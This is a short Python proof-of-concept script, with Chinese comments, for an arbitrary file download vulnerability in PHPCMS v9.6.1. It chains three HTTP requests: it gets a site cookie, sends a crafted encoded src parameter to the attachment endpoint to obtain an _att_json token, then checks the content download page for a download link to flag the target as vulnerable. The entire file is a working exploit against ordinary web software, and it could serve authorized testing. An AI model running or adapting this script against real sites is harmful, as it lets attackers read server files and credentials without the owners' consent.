# coding: utf-8
'''
name: PHPCMS v9.6.1 任意文件下载
author: Anka9080
description: 过滤函数不严谨导致任意文件下载。
'''
import sys
import requests
from termcolor import cprint

def poc(target):
    print('第一次请求，获取 cookie_siteid ')
    url = target +'index.php?m=wap&c=index&a=init&siteid=1'
    s = requests.Session()
    r = s.get(url)
    cookie_siteid =  r.headers['set-cookie']
    cookie_siteid = cookie_siteid[cookie_siteid.index('=')+1:]
    # print cookie_siteid
    print('第二次请求，获取 att_json ')
    
    url = target + 'index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C'
    post_data = {
        'userid_flash':cookie_siteid
    }
    r = s.post(url,post_data)
    # print r.headers
    for cookie in s.cookies:
        if '_att_json' in cookie.name:
            cookie_att_json = cookie.value
    # print cookie_att_json
    print('第三次请求，获取 文件下载链接 ')
    url = target + 'index.php?m=content&c=down&a=init&a_k=' + cookie_att_json
    r = s.get(url)
    if 'm=content&c=down&a=download&a_k=' in r.text:
        cprint('[!] Vul : {}'.format(target),'red')
        return True
    else:
        return False
if __name__ == "__main__":

    poc('http://localhost/PHPCMS/PHPCMS_v9.6.1/')